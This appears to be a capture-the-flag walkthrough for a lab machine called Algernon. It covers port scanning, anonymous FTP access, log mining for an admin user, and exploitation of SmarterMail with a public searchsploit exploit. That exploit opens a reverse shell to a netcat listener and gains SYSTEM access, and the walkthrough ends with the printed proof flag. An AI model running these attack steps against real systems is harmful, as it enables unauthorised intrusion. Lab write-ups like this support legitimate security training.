@@ -1,0 +1,178 @@
+																							    Algernon Walkthrough
+																										
+Attacker's Machine: 192.168.45.231
+Victim's Machine: 192.168.171.65
+export IP=192.168.171.65
+	
+1. nmap -Pn -p- -n  --min-rate 1000 $IP --stats-every=5s
+
+21/tcp    open  ftp
+80/tcp    open  http
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+5040/tcp  open  unknown
+9998/tcp  open  distinct32
+17001/tcp open  unknown
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49668/tcp open  unknown
+49669/tcp open  unknown
+
+3. nmap -Pn -n -sC -sV -p21,22,80 $IP --open --stats-every=5s -oN results.txt
+
+PORT      STATE SERVICE       VERSION
+21/tcp     open  ftp     Microsoft ftpd
+80/tcp     open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: IIS Windows
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+5040/tcp  open  unknown
+9998/tcp  open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+| http-title: Site doesn't have a title (text/html; charset=utf-8).
+|_Requested resource was /interface/root
+17001/tcp open  remoting      MS .NET Remoting services
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+nmap -sU -n -Pn $IP --top-ports=100 --stats-every=5s
+53/udp    open|filtered domain
+123/udp   open|filtered ntp
+137/udp   open|filtered netbios-ns
+138/udp   open|filtered netbios-dgm
+500/udp   open|filtered isakmp
+631/udp   open|filtered ipp
+997/udp   open|filtered maitrd
+1026/udp  open|filtered win-rpc
+1030/udp  open|filtered iad1
+1812/udp  open|filtered radius
+1900/udp  open|filtered upnp
+4500/udp  open|filtered nat-t-ike
+5353/udp  open|filtered zeroconf
+10000/udp open|filtered ndmp
+49153/udp open|filtered unknown
+49191/udp open|filtered unknown
+49193/udp open|filtered unknown
+
+
+3. nmap -sU -n -Pn $IP --top-ports=100 --stats-every=5s --min-rate 1000 
+ <!-- nothing -->
+ 
+
+Ok, let's go port by port to see if we get anything of interest.
+
+FTP - Port 21:
+
+ftp $IP 21
+anonymous
+empty password
+
+ftp $IP 21
+ftp> dir
+229 Entering Extended Passive Mode (|||49874|)
+150 Opening ASCII mode data connection.
+04-29-20  10:31PM       <DIR>          ImapRetrieval
+08-08-23  02:36AM       <DIR>          Logs
+04-29-20  10:31PM       <DIR>          PopRetrieval
+04-29-20  10:32PM       <DIR>          Spool
+
+# Let's download everything and inspect files of interest
+
+ wget -m --no-passive ftp://anonymous:anonymous@$IP
+ 
+# Let's go for a quick search and grep within the directory to see if you finds credentials.
+
+cd home/kali/192.168.171.65/Logs
+grep -Ri 'admin' . --colour=auto
+
+./2020.05.12-administrative.log:03:35:45.726 [192.168.118.6] User @ calling create primary system admin, username: admin
+./2020.05.12-administrative.log:03:35:47.054 [192.168.118.6] Webmail Attempting to login user: admin
+./2020.05.12-administrative.log:03:35:47.054 [192.168.118.6] Webmail Login successful: With user admin
+./2020.05.12-administrative.log:03:35:55.820 [192.168.118.6] Webmail Attempting to login user: admin
+./2020.05.12-administrative.log:03:35:55.820 [192.168.118.6] Webmail Login successful: With user admin
+./2020.05.12-administrative.log:03:36:00.195 [192.168.118.6] User admin@ calling set setup wizard settings
+./2020.05.12-administrative.log:03:36:08.242 [192.168.118.6] User admin@ logging out
+
+# So, we know that we have a user ‘admin’ present, but we don't know where yet. Let's continue
+
+cat 2020.04.29-delivery.log
+22:31:35.692 Updating ClamAV database...
+22:32:23.254 Updating the ClamAV database has completed successfully
+22:32:23.254 Updating ClamAV database...
+22:35:18.910 Updating the ClamAV database has completed successfully
+23:15:58.747 Relay server stopped at 4/29/2020 11:15:58 PM
+23:16:47.621 Delivery server started at 4/29/2020 11:16:47 PM
+23:16:47.652 Updating ClamAV database...
+23:18:05.980 Updating the ClamAV database has completed successfully
+
+# This info might be usefull to us later on, maybe.
+
+139, 445 - SMB
+
+enum4linux -a $IP             # no results
+
+Port 80 - HTTP                   # dead end
+
+Port 9998 - HTTP
+
+
+
+# Aparently, there is a rate limit in place so we cannot brute force the login page with the username ‘admin’.
+
+# Let's search online for some exploits for SmarterMail
+
+searchsploit smartermail
+
+SmarterMail 16 - Arbitrary File Upload                                                                                       | multiple/webapps/48580.py
+SmarterMail 7.1.3876 - Directory Traversal                                                                                   | windows/remote/15048.txt
+SmarterMail 7.3/7.4 - Multiple Vulnerabilities                                                                               | asp/webapps/16955.txt
+SmarterMail 8.0 - Multiple Cross-Site Scripting Vulnerabilities                                                              | asp/webapps/16975.txt
+SmarterMail < 7.2.3925 - LDAP Injection                                                                                      | asp/webapps/15189.txt
+SmarterMail < 7.2.3925 - Persistent Cross-Site Scripting                                                                     | asp/webapps/15185.txt
+SmarterMail Build 6985 - Remote Code Execution                                                                               | windows/remote/49216.py
+SmarterMail Enterprise and Standard 11.x - Persistent Cross-Site Scripting                                                   | asp/webapps/31017.php
+smartermail free 9.2 - Persistent Cross-Site Scripting                                                                       | windows/webapps/20362.py
+SmarterTools SmarterMail 4.3 - 'Subject' HTML Injection                                                                      | php/webapps/31240.txt
+SmarterTools SmarterMail 5.0 - HTTP Request Handling Denial of Service                                                       | windows/dos/31607.py
+
+
+searchsploit -m windows/remote/49216.py
+
+# Change the IPs
+
+nano 49216.py
+
+
+
+# Have a netcat listener opened on 4444
+
+nc -lvnp 4444
+
+# Run the exploit
+
+python3 49216.py
+
+nc -lvnp 4444                                            
+listening on [any] 4444 ...
+connect to [192.168.45.231] from (UNKNOWN) [192.168.171.65] 49953
+whoami
+nt authority\system
+
+# Let's check for the flag
+
+cd C:\Users\Administrator\Desktop
+cat proof.txt
+
+3df911474612402a302885c9ae612a7c
